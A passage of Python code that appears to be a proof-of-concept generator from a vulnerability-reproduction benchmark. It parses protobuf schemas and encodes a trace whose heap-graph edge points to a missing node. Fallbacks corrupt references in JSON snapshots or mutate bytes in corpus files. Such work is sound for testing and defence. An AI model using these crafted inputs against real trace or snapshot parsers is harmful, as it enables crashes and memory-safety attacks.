import os
import re
import tarfile
from dataclasses import dataclass
from typing import Dict, List, Optional, Tuple, Iterable, Set, Union


@dataclass
class ProtoField:
    name: str
    number: int
    label: str  # "optional", "repeated", "required", ""
    type_name: str  # as written (possibly relative)
    parent_msg: str  # full name of parent message


@dataclass
class ProtoMessage:
    full_name: str
    fields: List[ProtoField]


_BUILTIN_VARINT_TYPES = {
    "int32", "int64", "uint32", "uint64", "sint32", "sint64",
    "bool", "enum",
}
_BUILTIN_32BIT_TYPES = {"fixed32", "sfixed32", "float"}
_BUILTIN_64BIT_TYPES = {"fixed64", "sfixed64", "double"}
_BUILTIN_LEN_TYPES = {"string", "bytes"}
_BUILTIN_ALL = _BUILTIN_VARINT_TYPES | _BUILTIN_32BIT_TYPES | _BUILTIN_64BIT_TYPES | _BUILTIN_LEN_TYPES


def _encode_varint(n: int) -> bytes:
    if n < 0:
        n &= (1 << 64) - 1
    out = bytearray()
    while True:
        b = n & 0x7F
        n >>= 7
        if n:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _encode_zigzag(n: int) -> int:
    return (n << 1) ^ (n >> 63)


def _encode_key(field_no: int, wire_type: int) -> bytes:
    return _encode_varint((field_no << 3) | wire_type)


def _encode_field_varint(field_no: int, value: int) -> bytes:
    return _encode_key(field_no, 0) + _encode_varint(value)


def _encode_field_32(field_no: int, value: int) -> bytes:
    return _encode_key(field_no, 5) + int(value & 0xFFFFFFFF).to_bytes(4, "little", signed=False)


def _encode_field_64(field_no: int, value: int) -> bytes:
    return _encode_key(field_no, 1) + int(value & 0xFFFFFFFFFFFFFFFF).to_bytes(8, "little", signed=False)


def _encode_field_bytes(field_no: int, data: bytes) -> bytes:
    return _encode_key(field_no, 2) + _encode_varint(len(data)) + data


def _strip_proto_comments(s: str) -> str:
    s = re.sub(r"/\*.*?\*/", "", s, flags=re.S)
    s = re.sub(r"//.*?$", "", s, flags=re.M)
    return s


_TOKEN_RE = re.compile(r'"(?:\\.|[^"])*"|[A-Za-z_][A-Za-z0-9_]*|\d+|[{}[\];=<>(),.]')


def _tokenize_proto(s: str) -> List[str]:
    return _TOKEN_RE.findall(s)


class ProtoRegistry:
    def __init__(self) -> None:
        self.messages: Dict[str, ProtoMessage] = {}
        self.simple_to_full: Dict[str, List[str]] = {}

    def add_message(self, msg: ProtoMessage) -> None:
        self.messages[msg.full_name] = msg
        simple = msg.full_name.rsplit(".", 1)[-1]
        self.simple_to_full.setdefault(simple, []).append(msg.full_name)

    def resolve_type(self, type_name: str, parent_msg_full: str, package: str) -> Optional[str]:
        if not type_name:
            return None
        if type_name in _BUILTIN_ALL:
            return type_name
        if type_name.startswith("."):
            return type_name if type_name in self.messages else type_name

        # Try resolving relative to enclosing scopes.
        # parent_msg_full: ".pkg.Outer.Inner"
        scopes = [p for p in parent_msg_full.split(".") if p]
        # namespaces: ".pkg.Outer.Inner", ".pkg.Outer", ".pkg"
        namespaces = []
        for i in range(len(scopes), 0, -1):
            namespaces.append("." + ".".join(scopes[:i]))
        if package:
            namespaces.append("." + package)
        else:
            namespaces.append("")

        # If type_name has dots, treat them as nested reference
        tparts = type_name.split(".")
        for ns in namespaces:
            cand = (ns + "." + type_name) if ns else ("." + type_name)
            if cand in self.messages:
                return cand
            # Also try each suffix with namespace (for nested message lookups)
            if len(tparts) > 1:
                cand2 = (ns + "." + tparts[-1]) if ns else ("." + tparts[-1])
                if cand2 in self.messages:
                    return cand2

        # Try global by simple name
        if type_name in self.simple_to_full and len(self.simple_to_full[type_name]) == 1:
            return self.simple_to_full[type_name][0]

        # Default to package-qualified
        if package:
            return "." + package + "." + type_name
        return "." + type_name


class ProtoParser:
    def __init__(self, registry: ProtoRegistry) -> None:
        self.reg = registry

    def parse_file(self, text: str) -> None:
        text = _strip_proto_comments(text)
        toks = _tokenize_proto(text)
        i = 0
        package = ""
        msg_stack: List[str] = []

        def peek() -> str:
            return toks[i] if i < len(toks) else ""

        def consume(expected: Optional[str] = None) -> str:
            nonlocal i
            if i >= len(toks):
                return ""
            t = toks[i]
            if expected is not None and t != expected:
                return ""
            i += 1
            return t

        def parse_full_ident() -> str:
            parts = []
            if peek() == ".":
                consume(".")
                parts.append("")  # leading dot marker
            if not re.match(r"^[A-Za-z_]", peek() or ""):
                return ""
            parts.append(consume())
            while peek() == ".":
                consume(".")
                if not re.match(r"^[A-Za-z_]", peek() or ""):
                    break
                parts.append(consume())
            if parts and parts[0] == "":
                return "." + ".".join(parts[1:])
            return ".".join(parts)

        def parse_until_semicolon() -> None:
            nonlocal i
            while i < len(toks) and toks[i] != ";":
                i += 1
            if i < len(toks) and toks[i] == ";":
                i += 1

        def parse_skip_block() -> None:
            nonlocal i
            # assumes current token is '{'
            if peek() != "{":
                return
            depth = 0
            while i < len(toks):
                t = consume()
                if t == "{":
                    depth += 1
                elif t == "}":
                    depth -= 1
                    if depth == 0:
                        return

        def current_namespace_full() -> str:
            if package:
                base = "." + package
            else:
                base = ""
            if msg_stack:
                return base + "." + ".".join(msg_stack)
            return base

        def parse_field(parent_full: str, label_tok: str) -> Optional[ProtoField]:
            nonlocal i
            label = label_tok if label_tok in ("optional", "repeated", "required") else ""
            if not label and label_tok:
                # label_tok is actually the first token of type
                i -= 1

            if peek() == "map":
                parse_until_semicolon()
                return None

            tname = parse_full_ident() or ""
            if not tname:
                # maybe unqualified type: identifier without dots
                if re.match(r"^[A-Za-z_]", peek() or ""):
                    tname = consume()
                else:
                    parse_until_semicolon()
                    return None

            if not re.match(r"^[A-Za-z_]", peek() or ""):
                parse_until_semicolon()
                return None
            fname = consume()

            if consume("=") != "=":
                parse_until_semicolon()
                return None

            numtok = consume()
            if not numtok.isdigit():
                parse_until_semicolon()
                return None
            fno = int(numtok)

            # skip options: [ ... ]
            if peek() == "[":
                depth = 0
                while i < len(toks):
                    t = consume()
                    if t == "[":
                        depth += 1
                    elif t == "]":
                        depth -= 1
                        if depth == 0:
                            break

            # consume trailing ';'
            parse_until_semicolon()

            return ProtoField(name=fname, number=fno, label=label, type_name=tname, parent_msg=parent_full)

        def parse_oneof(parent_full: str) -> None:
            # consume 'oneof' already seen
            if not re.match(r"^[A-Za-z_]", peek() or ""):
                return
            consume()  # oneof name
            if consume("{") != "{":
                return
            # fields until '}'
            while i < len(toks) and peek() != "}":
                # oneof fields: <type> <name> = <number> ...
                fld = parse_field(parent_full, "")
                if fld:
                    self.reg.messages[parent_full].fields.append(fld)
            consume("}")

        def parse_message_decl() -> None:
            nonlocal i
            # consume 'message' already seen
            if not re.match(r"^[A-Za-z_]", peek() or ""):
                return
            name = consume()
            msg_stack.append(name)
            full = current_namespace_full()
            self.reg.add_message(ProtoMessage(full_name=full, fields=[]))
            if consume("{") != "{":
                msg_stack.pop()
                return

            while i < len(toks) and peek() != "}":
                t = peek()
                if t == "message":
                    consume("message")
                    parse_message_decl()
                elif t == "enum":
                    consume("enum")
                    if re.match(r"^[A-Za-z_]", peek() or ""):
                        consume()
                    if peek() == "{":
                        parse_skip_block()
                    else:
                        parse_until_semicolon()
                elif t == "oneof":
                    consume("oneof")
                    parse_oneof(full)
                elif t in ("optional", "repeated", "required"):
                    lab = consume()
                    fld = parse_field(full, lab)
                    if fld:
                        self.reg.messages[full].fields.append(fld)
                elif t in ("reserved", "extensions", "extend", "option", "syntax", "import", "package"):
                    # skip statements or blocks
                    consume()
                    if t == "extend":
                        if re.match(r"^[A-Za-z_]", peek() or "") or peek() == ".":
                            parse_full_ident()
                        if peek() == "{":
                            parse_skip_block()
                        else:
                            parse_until_semicolon()
                    elif peek() == "{":
                        parse_skip_block()
                    else:
                        parse_until_semicolon()
                else:
                    # likely a field without explicit label (proto3)
                    fld = parse_field(full, "")
                    if fld:
                        self.reg.messages[full].fields.append(fld)
                    else:
                        # avoid infinite loop
                        consume()
            consume("}")
            msg_stack.pop()

        while i < len(toks):
            t = peek()
            if t == "package":
                consume("package")
                p = parse_full_ident()
                if p.startswith("."):
                    p = p[1:]
                package = p
                consume(";")
            elif t == "message":
                consume("message")
                parse_message_decl()
            else:
                consume()


def _is_numeric_type(t: str) -> bool:
    if t in _BUILTIN_VARINT_TYPES or t in _BUILTIN_32BIT_TYPES or t in _BUILTIN_64BIT_TYPES:
        return True
    return False


def _is_len_type(t: str) -> bool:
    return t in _BUILTIN_LEN_TYPES


def _wire_type_for_builtin(t: str) -> int:
    if t in _BUILTIN_VARINT_TYPES:
        return 0
    if t in _BUILTIN_64BIT_TYPES:
        return 1
    if t in _BUILTIN_LEN_TYPES:
        return 2
    if t in _BUILTIN_32BIT_TYPES:
        return 5
    return 2


def _encode_value_for_type(t: str, value: Union[int, bytes, str]) -> Tuple[int, bytes]:
    # returns (wire_type, encoded_value_no_key)
    if t in ("sint32", "sint64"):
        v = int(value)
        zz = _encode_zigzag(v)
        return 0, _encode_varint(zz)
    if t in _BUILTIN_VARINT_TYPES or t == "enum":
        return 0, _encode_varint(int(value))
    if t in _BUILTIN_32BIT_TYPES:
        return 5, int(value).to_bytes(4, "little", signed=False)
    if t in _BUILTIN_64BIT_TYPES:
        return 1, int(value).to_bytes(8, "little", signed=False)
    if t == "string":
        if isinstance(value, bytes):
            b = value
        else:
            b = str(value).encode("utf-8", errors="ignore")
        return 2, _encode_varint(len(b)) + b
    if t == "bytes":
        b = value if isinstance(value, (bytes, bytearray)) else bytes(value)
        return 2, _encode_varint(len(b)) + b
    # embedded message
    b = value if isinstance(value, (bytes, bytearray)) else bytes(value)
    return 2, _encode_varint(len(b)) + b


def _encode_message_fields(fields: List[Tuple[int, int, bytes]]) -> bytes:
    # fields: list of (field_no, wire_type, encoded_value_no_key) where encoded_value includes length-prefix if wire_type==2
    out = bytearray()
    for fno, w, val in fields:
        out += _encode_key(fno, w)
        out += val
    return bytes(out)


def _read_all_files_from_tar(src_path: str) -> Iterable[Tuple[str, bytes]]:
    with tarfile.open(src_path, "r:*") as tf:
        for m in tf:
            if not m.isreg():
                continue
            if m.size <= 0:
                continue
            try:
                f = tf.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            yield m.name, data


def _read_all_files_from_dir(src_path: str) -> Iterable[Tuple[str, bytes]]:
    for root, _, files in os.walk(src_path):
        for fn in files:
            p = os.path.join(root, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size <= 0:
                continue
            if st.st_size > 2_000_000:
                continue
            try:
                with open(p, "rb") as f:
                    data = f.read()
            except Exception:
                continue
            rel = os.path.relpath(p, src_path)
            yield rel, data


def _iter_src_files(src_path: str) -> Iterable[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _read_all_files_from_dir(src_path)
        return
    try:
        if tarfile.is_tarfile(src_path):
            yield from _read_all_files_from_tar(src_path)
            return
    except Exception:
        pass
    # fallback: treat as a single file
    try:
        with open(src_path, "rb") as f:
            yield os.path.basename(src_path), f.read()
    except Exception:
        return


def _collect_proto_registry(src_path: str) -> ProtoRegistry:
    reg = ProtoRegistry()
    parser = ProtoParser(reg)
    for name, data in _iter_src_files(src_path):
        if not name.lower().endswith(".proto"):
            continue
        if len(data) > 2_000_000:
            continue
        try:
            text = data.decode("utf-8", errors="ignore")
        except Exception:
            continue
        try:
            parser.parse_file(text)
        except Exception:
            continue
    return reg


def _pick_trace_and_packet(reg: ProtoRegistry) -> Tuple[Optional[str], Optional[str], Optional[int]]:
    trace_full = None
    packet_full = None
    packet_field_no = None

    # Find TracePacket message
    if "TracePacket" in reg.simple_to_full:
        # Prefer a non-test package if possible
        cands = reg.simple_to_full["TracePacket"]
        packet_full = cands[0]
        for c in cands:
            if "test" not in c.lower():
                packet_full = c
                break
    else:
        for fn in reg.messages:
            if fn.endswith(".TracePacket"):
                packet_full = fn
                break

    if not packet_full:
        return None, None, None

    # Find Trace message with repeated field to TracePacket
    trace_cands = []
    for mname, msg in reg.messages.items():
        if mname.rsplit(".", 1)[-1] != "Trace" and not mname.endswith(".Trace"):
            continue
        for f in msg.fields:
            rtype = reg.resolve_type(f.type_name, msg.full_name, package=mname.split(".")[1] if mname.startswith(".") and len(mname.split(".")) > 2 else "")
            if f.label == "repeated" and rtype == packet_full:
                trace_cands.append((mname, f.number, f.name))
    if trace_cands:
        trace_full, packet_field_no, _ = sorted(trace_cands, key=lambda x: (0 if x[2] == "packet" else 1, x[1]))[0]
        return trace_full, packet_full, packet_field_no

    # If no Trace wrapper found, we can still emit a stream encoding of repeated Trace.packet = TracePacket
    # Usually packet field number is 1 and wire type is 2; use that as fallback.
    return None, packet_full, 1


def _message_has_id_field(reg: ProtoRegistry, msg_full: str) -> Optional[ProtoField]:
    msg = reg.messages.get(msg_full)
    if not msg:
        return None
    best = None
    for f in msg.fields:
        t = reg.resolve_type(f.type_name, msg_full, "")
        if not t or t.startswith(".") or not _is_numeric_type(t):
            continue
        nm = f.name.lower()
        if nm == "id":
            return f
        if nm.endswith("_id"):
            best = best or f
    return best


def _find_repeated_msg_fields(reg: ProtoRegistry, msg_full: str, substr: str) -> List[ProtoField]:
    msg = reg.messages.get(msg_full)
    if not msg:
        return []
    out = []
    for f in msg.fields:
        if f.label != "repeated":
            continue
        if substr in f.name.lower():
            out.append(f)
    return out


def _find_candidate_graph_messages(reg: ProtoRegistry) -> List[Tuple[int, str, ProtoField, Optional[ProtoField], str]]:
    # returns list of (score, heapgraph_full, node_field, edge_field_or_none, node_type_full)
    candidates = []
    for mname, msg in reg.messages.items():
        mlow = mname.lower()
        node_fields = _find_repeated_msg_fields(reg, mname, "node")
        if not node_fields:
            continue
        for nf in node_fields:
            ntype = reg.resolve_type(nf.type_name, mname, "")
            if not ntype or not ntype.startswith("."):
                continue
            idf = _message_has_id_field(reg, ntype)
            if not idf:
                continue

            edge_fields = _find_repeated_msg_fields(reg, mname, "edge")
            edge_field = edge_fields[0] if edge_fields else None

            score = 0
            if "heap" in mlow:
                score += 20
            if "graph" in mlow:
                score += 10
            if "profile" in mlow:
                score += 3
            if edge_field:
                score += 15
            score += 5
            candidates.append((score, mname, nf, edge_field, ntype))
    candidates.sort(reverse=True, key=lambda x: x[0])
    return candidates


def _find_edge_id_fields(reg: ProtoRegistry, edge_msg_full: str) -> Tuple[Optional[ProtoField], Optional[ProtoField], Optional[ProtoField]]:
    # (to_field, from_field, any_id_field)
    msg = reg.messages.get(edge_msg_full)
    if not msg:
        return None, None, None

    to_best = None
    from_best = None
    any_id = None

    for f in msg.fields:
        t = reg.resolve_type(f.type_name, edge_msg_full, "")
        if not t or t.startswith(".") or not _is_numeric_type(t):
            continue
        nm = f.name.lower()
        if "id" not in nm and not nm.endswith("node") and "node" not in nm:
            continue
        any_id = any_id or f
        if ("to" in nm or "dst" in nm or "dest" in nm or "target" in nm) and ("id" in nm or "node" in nm):
            if to_best is None or (nm == "to_node_id" or nm == "to_id"):
                to_best = f
        if ("from" in nm or "src" in nm or "source" in nm) and ("id" in nm or "node" in nm):
            if from_best is None or (nm == "from_node_id" or nm == "source_node_id" or nm == "from_id"):
                from_best = f

    return to_best, from_best, any_id


def _find_path_to_target(reg: ProtoRegistry, start_msg_full: str, target_msg_full: str, max_depth: int = 5) -> Optional[List[ProtoField]]:
    if start_msg_full == target_msg_full:
        return []
    q: List[Tuple[str, List[ProtoField]]] = [(start_msg_full, [])]
    visited: Set[str] = {start_msg_full}

    while q:
        cur, path = q.pop(0)
        if len(path) >= max_depth:
            continue
        msg = reg.messages.get(cur)
        if not msg:
            continue
        for f in msg.fields:
            rtype = reg.resolve_type(f.type_name, cur, "")
            if not rtype or not rtype.startswith("."):
                continue
            if rtype == target_msg_full:
                return path + [f]
            if rtype not in visited:
                visited.add(rtype)
                q.append((rtype, path + [f]))
    return None


def _choose_pid_field(reg: ProtoRegistry, msg_full: str) -> Optional[ProtoField]:
    msg = reg.messages.get(msg_full)
    if not msg:
        return None
    best = None
    for f in msg.fields:
        t = reg.resolve_type(f.type_name, msg_full, "")
        if not t or t.startswith(".") or not _is_numeric_type(t):
            continue
        nm = f.name.lower()
        if nm in ("pid", "process_id", "processid"):
            return f
        if "pid" in nm or "process" in nm:
            best = best or f
    return best


def _choose_timestamp_field(reg: ProtoRegistry, msg_full: str) -> Optional[ProtoField]:
    msg = reg.messages.get(msg_full)
    if not msg:
        return None
    for f in msg.fields:
        t = reg.resolve_type(f.type_name, msg_full, "")
        if not t or t.startswith(".") or not _is_numeric_type(t):
            continue
        if f.name.lower() == "timestamp":
            return f
    return None


def _build_heap_graph_message(reg: ProtoRegistry, heapgraph_full: str, node_field: ProtoField, node_type_full: str, edge_field: Optional[ProtoField]) -> bytes:
    # node id = 1, edge to missing id = 2
    node_id = 1
    missing_id = 2

    # Build node message
    node_fields: List[Tuple[int, int, bytes]] = []
    idf = _message_has_id_field(reg, node_type_full)
    if not idf:
        # Cannot build
        return b""
    id_type = reg.resolve_type(idf.type_name, node_type_full, "") or "uint64"
    w, ev = _encode_value_for_type(id_type if id_type in _BUILTIN_ALL else "uint64", node_id)
    node_fields.append((idf.number, w, ev))

    # Optionally include pid-like fields in node (rare)
    nid_pid = _choose_pid_field(reg, node_type_full)
    if nid_pid and nid_pid.number != idf.number:
        pid_type = reg.resolve_type(nid_pid.type_name, node_type_full, "") or "uint32"
        w2, ev2 = _encode_value_for_type(pid_type if pid_type in _BUILTIN_ALL else "uint32", 1)
        node_fields.append((nid_pid.number, w2, ev2))

    node_msg = _encode_message_fields(node_fields)

    heap_fields: List[Tuple[int, int, bytes]] = []
    # pid/process_id in heapgraph
    pidf = _choose_pid_field(reg, heapgraph_full)
    if pidf:
        pid_type = reg.resolve_type(pidf.type_name, heapgraph_full, "") or "uint32"
        wpid, evpid = _encode_value_for_type(pid_type if pid_type in _BUILTIN_ALL else "uint32", 1)
        heap_fields.append((pidf.number, wpid, evpid))

    # Add one node
    heap_fields.append((node_field.number, 2, _encode_varint(len(node_msg)) + node_msg))

    # Edges: prefer heapgraph.repeated edge
    if edge_field:
        edge_type_full = reg.resolve_type(edge_field.type_name, heapgraph_full, "")
        if edge_type_full and edge_type_full.startswith(".") and edge_type_full in reg.messages:
            to_f, from_f, any_id = _find_edge_id_fields(reg, edge_type_full)
            edge_fields_enc: List[Tuple[int, int, bytes]] = []

            # set from (if available) to existing node_id
            if from_f:
                ft = reg.resolve_type(from_f.type_name, edge_type_full, "") or "uint64"
                wf, evf = _encode_value_for_type(ft if ft in _BUILTIN_ALL else "uint64", node_id)
                edge_fields_enc.append((from_f.number, wf, evf))

            # set to (prefer) to missing id
            if to_f:
                tt = reg.resolve_type(to_f.type_name, edge_type_full, "") or "uint64"
                wt, evt = _encode_value_for_type(tt if tt in _BUILTIN_ALL else "uint64", missing_id)
                edge_fields_enc.append((to_f.number, wt, evt))
            elif any_id:
                at = reg.resolve_type(any_id.type_name, edge_type_full, "") or "uint64"
                wa, eva = _encode_value_for_type(at if at in _BUILTIN_ALL else "uint64", missing_id)
                edge_fields_enc.append((any_id.number, wa, eva))

            edge_msg = _encode_message_fields(edge_fields_enc)
            heap_fields.append((edge_field.number, 2, _encode_varint(len(edge_msg)) + edge_msg))
        else:
            # If edge field is not a message, try setting it as repeated numeric reference to missing_id
            et = reg.resolve_type(edge_field.type_name, heapgraph_full, "")
            if et and not et.startswith(".") and _is_numeric_type(et):
                w, ev = _encode_value_for_type(et, missing_id)
                heap_fields.append((edge_field.number, w, ev))

    else:
        # Try embedding an edge inside node message if node has repeated edge/reference fields.
        node_msg_def = reg.messages.get(node_type_full)
        if node_msg_def:
            # find repeated field in node that looks like an edge or reference
            best_ref = None
            best_edge = None
            for f in node_msg_def.fields:
                if f.label != "repeated":
                    continue
                nm = f.name.lower()
                rt = reg.resolve_type(f.type_name, node_type_full, "")
                if not rt:
                    continue
                if rt.startswith("."):
                    if "edge" in nm or "ref" in nm or "reference" in nm:
                        best_edge = best_edge or f
                else:
                    if _is_numeric_type(rt) and ("to" in nm or "child" in nm or "ref" in nm or "edge" in nm or "node" in nm):
                        best_ref = best_ref or f

            if best_edge:
                edge_type_full = reg.resolve_type(best_edge.type_name, node_type_full, "")
                if edge_type_full and edge_type_full.startswith(".") and edge_type_full in reg.messages:
                    to_f, from_f, any_id = _find_edge_id_fields(reg, edge_type_full)
                    edge_fields_enc: List[Tuple[int, int, bytes]] = []
                    if from_f:
                        ft = reg.resolve_type(from_f.type_name, edge_type_full, "") or "uint64"
                        wf, evf = _encode_value_for_type(ft if ft in _BUILTIN_ALL else "uint64", node_id)
                        edge_fields_enc.append((from_f.number, wf, evf))
                    if to_f:
                        tt = reg.resolve_type(to_f.type_name, edge_type_full, "") or "uint64"
                        wt, evt = _encode_value_for_type(tt if tt in _BUILTIN_ALL else "uint64", missing_id)
                        edge_fields_enc.append((to_f.number, wt, evt))
                    elif any_id:
                        at = reg.resolve_type(any_id.type_name, edge_type_full, "") or "uint64"
                        wa, eva = _encode_value_for_type(at if at in _BUILTIN_ALL else "uint64", missing_id)
                        edge_fields_enc.append((any_id.number, wa, eva))
                    edge_msg = _encode_message_fields(edge_fields_enc)

                    # rebuild node message to include repeated edge
                    node_msg2 = node_msg + _encode_field_bytes(best_edge.number, edge_msg)
                    # replace node in heap_fields: last node field entry might already be added; adjust by rebuilding heap_fields
                    heap_fields = [f for f in heap_fields if f[0] != node_field.number]
                    heap_fields.append((node_field.number, 2, _encode_varint(len(node_msg2)) + node_msg2))
                # else ignore
            elif best_ref:
                rt = reg.resolve_type(best_ref.type_name, node_type_full, "") or "uint64"
                w, ev = _encode_value_for_type(rt if rt in _BUILTIN_ALL else "uint64", missing_id)
                node_msg2 = node_msg + (_encode_key(best_ref.number, 0) + ev)
                heap_fields = [f for f in heap_fields if f[0] != node_field.number]
                heap_fields.append((node_field.number, 2, _encode_varint(len(node_msg2)) + node_msg2))

    return _encode_message_fields(heap_fields)


def _build_trace_packet_with_graph(reg: ProtoRegistry) -> Optional[bytes]:
    trace_full, packet_full, packet_field_no = _pick_trace_and_packet(reg)
    if not packet_full or not packet_field_no:
        return None

    graph_cands = _find_candidate_graph_messages(reg)
    if not graph_cands:
        return None

    # pick best heapgraph message candidate
    _, heapgraph_full, node_field, edge_field, node_type_full = graph_cands[0]

    # find embedding path from TracePacket to heapgraph_full
    path = _find_path_to_target(reg, packet_full, heapgraph_full, max_depth=6)
    if path is None:
        # maybe heapgraph is directly in TracePacket? if so, path empty if equal
        if packet_full != heapgraph_full:
            # as a fallback: look for any field in TracePacket that looks like heapgraph and use that directly
            msg = reg.messages.get(packet_full)
            if not msg:
                return None
            best_direct = None
            best_score = -1
            for f in msg.fields:
                rt = reg.resolve_type(f.type_name, packet_full, "")
                if not rt or not rt.startswith("."):
                    continue
                s = 0
                nm = f.name.lower()
                if "heap" in nm:
                    s += 10
                if "graph" in nm:
                    s += 10
                if rt == heapgraph_full:
                    s += 20
                if s > best_score:
                    best_score = s
                    best_direct = f
            if best_direct:
                path = [best_direct]
            else:
                return None

    heap_msg = _build_heap_graph_message(reg, heapgraph_full, node_field, node_type_full, edge_field)
    if not heap_msg:
        return None

    # Wrap heapgraph message along the path from TracePacket -> ... -> HeapGraph
    current_bytes = heap_msg
    current_msg_full = heapgraph_full
    # Build from inner to outer: reverse path
    for f in reversed(path):
        parent_full = f.parent_msg
        ftype_res = reg.resolve_type(f.type_name, parent_full, "")
        # ftype_res should match current_msg_full, but don't strictly require
        wrapper_fields: List[Tuple[int, int, bytes]] = []
        # Add pid/process_id if present at this wrapper level and not already set in inner
        pidf = _choose_pid_field(reg, parent_full)
        if pidf:
            t = reg.resolve_type(pidf.type_name, parent_full, "") or "uint32"
            wt, ev = _encode_value_for_type(t if t in _BUILTIN_ALL else "uint32", 1)
            wrapper_fields.append((pidf.number, wt, ev))

        wrapper_fields.append((f.number, 2, _encode_varint(len(current_bytes)) + current_bytes))
        current_bytes = _encode_message_fields(wrapper_fields)
        current_msg_full = parent_full

    # current_bytes now is the TracePacket message bytes (or a submessage if path doesn't start at TracePacket)
    # If path started at TracePacket, current_msg_full should be packet_full. If not, embed into TracePacket by best field (fallback)
    if current_msg_full != packet_full:
        # Try to embed into TracePacket by finding a field whose type matches current_msg_full
        tp = reg.messages.get(packet_full)
        if not tp:
            return None
        embed_field = None
        for f in tp.fields:
            rt = reg.resolve_type(f.type_name, packet_full, "")
            if rt == current_msg_full:
                embed_field = f
                break
        if not embed_field:
            return None
        packet_fields: List[Tuple[int, int, bytes]] = []
        tsf = _choose_timestamp_field(reg, packet_full)
        if tsf:
            t = reg.resolve_type(tsf.type_name, packet_full, "") or "uint64"
            wt, ev = _encode_value_for_type(t if t in _BUILTIN_ALL else "uint64", 1)
            packet_fields.append((tsf.number, wt, ev))
        packet_fields.append((embed_field.number, 2, _encode_varint(len(current_bytes)) + current_bytes))
        current_bytes = _encode_message_fields(packet_fields)

    # Add timestamp if present (and not already set) to improve chances of import
    packet_fields2: List[Tuple[int, int, bytes]] = []
    tsf = _choose_timestamp_field(reg, packet_full)
    if tsf:
        t = reg.resolve_type(tsf.type_name, packet_full, "") or "uint64"
        wt, ev = _encode_value_for_type(t if t in _BUILTIN_ALL else "uint64", 1)
        packet_fields2.append((tsf.number, wt, ev))

    # Ensure we don't double-wrap: if timestamp exists, merge by prepending to existing packet bytes (safe)
    if packet_fields2:
        # crude: just add timestamp at front; protobuf ignores order
        current_bytes = _encode_message_fields(packet_fields2) + current_bytes

    # Finally, produce a Trace encoding containing one packet field (field number from Trace or fallback 1)
    # If trace_full is known, use its packet field number (packet_field_no already set). Otherwise use stream form with field=1.
    trace_packet_field_no = packet_field_no or 1
    trace_bytes = _encode_field_bytes(trace_packet_field_no, current_bytes)
    return trace_bytes


def _try_json_poc(src_path: str) -> Optional[bytes]:
    import json

    candidates: List[Tuple[int, str, bytes]] = []
    for name, data in _iter_src_files(src_path):
        low = name.lower()
        if len(data) > 200_000 or len(data) < 10:
            continue
        if not (low.endswith(".json") or low.endswith(".heapsnapshot") or "snapshot" in low or "heap" in low or "graph" in low):
            continue
        if b"nodes" not in data and b"edges" not in data:
            continue
        candidates.append((len(data), name, data))
    candidates.sort()

    for _, _, data in candidates[:50]:
        try:
            txt = data.decode("utf-8", errors="strict")
            obj = json.loads(txt)
        except Exception:
            continue

        if not isinstance(obj, dict):
            continue
        if "nodes" not in obj:
            continue

        nodes = obj.get("nodes")
        edges = obj.get("edges")
        # Minimal mutation: try to flip an existing integer reference in edges/nodes to a missing id.
        missing_id = 0x41414141

        # gather ids
        ids: Set[int] = set()
        if isinstance(nodes, list):
            for n in nodes:
                if isinstance(n, dict):
                    for k in ("id", "node_id", "nodeId", "nid"):
                        if k in n and isinstance(n[k], int):
                            ids.add(int(n[k]))
                            break
        if ids:
            missing_id = max(ids) + 1

        mutated = False

        def mutate_in_place(o):
            nonlocal mutated, missing_id
            if mutated:
                return
            if isinstance(o, dict):
                for k, v in list(o.items()):
                    if mutated:
                        return
                    lk = str(k).lower()
                    if isinstance(v, int):
                        if ids and v in ids and ("to" in lk or "target" in lk or "dst" in lk or "ref" in lk or "child" in lk or "node" in lk):
                            o[k] = missing_id
                            mutated = True
                            return
                    elif isinstance(v, list):
                        # list of ints references?
                        if v and all(isinstance(x, int) for x in v):
                            if ids and any(x in ids for x in v) and ("edge" in lk or "ref" in lk or "child" in lk or "to" in lk or "target" in lk):
                                v[0] = missing_id
                                mutated = True
                                return
                        for it in v:
                            mutate_in_place(it)
                    else:
                        mutate_in_place(v)
            elif isinstance(o, list):
                for it in o:
                    if mutated:
                        return
                    mutate_in_place(it)

        # Prefer mutating edges first
        if edges is not None:
            mutate_in_place(edges)
        if not mutated:
            mutate_in_place(obj)

        if not mutated:
            continue

        try:
            out = json.dumps(obj, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
            return out
        except Exception:
            continue

    return None


def _try_binary_mutation(src_path: str) -> Optional[bytes]:
    # Heuristic: find a small binary test/corpus file and change one repeated 32-bit word occurrence late in file.
    candidates: List[Tuple[int, int, str, bytes]] = []
    for name, data in _iter_src_files(src_path):
        low = name.lower()
        if len(data) < 20 or len(data) > 5000:
            continue
        if any(low.endswith(ext) for ext in (".cc", ".cpp", ".c", ".h", ".hpp", ".rs", ".go", ".java", ".py", ".md", ".txt", ".proto")):
            continue
        score = 0
        if any(k in low for k in ("poc", "crash", "corpus", "fuzz", "test", "regress")):
            score += 10
        if any(k in low for k in ("snapshot", "heap", "graph", "dump", "trace", "profile")):
            score += 8
        score -= abs(len(data) - 140) // 10
        candidates.append((-score, len(data), name, data))
    if not candidates:
        return None
    candidates.sort()

    _, _, _, data0 = candidates[0]
    data = bytearray(data0)

    def mutate_word(width: int) -> bool:
        nonlocal data
        if len(data) < width * 3:
            return False
        step = width
        vals = []
        for i in range(0, len(data) - width + 1, step):
            vals.append(int.from_bytes(data[i:i + width], "little", signed=False))
        freq: Dict[int, int] = {}
        for v in vals:
            freq[v] = freq.get(v, 0) + 1
        # pick a value with moderate frequency
        candidates_v = [v for v, c in freq.items() if 2 <= c <= 8 and v != 0 and v != 1]
        if not candidates_v:
            candidates_v = [v for v, c in freq.items() if c >= 2 and v != 0 and v != 1]
        if not candidates_v:
            return False
        candidates_v.sort(key=lambda v: (freq[v], v))
        v = candidates_v[0]
        positions = [i for i, x in enumerate(vals) if x == v]
        if len(positions) < 2:
            return False
        pos = positions[-1]  # mutate last occurrence
        newv = (v ^ 0xFFFFFFFFFFFFFFFF) & ((1 << (width * 8)) - 1)
        if newv in freq:
            newv = (v + 0x1234) & ((1 << (width * 8)) - 1)
        off = pos * width
        data[off:off + width] = int(newv).to_bytes(width, "little", signed=False)
        return True

    if mutate_word(4):
        return bytes(data)
    if mutate_word(8):
        return bytes(data)
    # fallback: flip one byte near end
    if len(data) > 10:
        data[-5] ^= 0xFF
        return bytes(data)
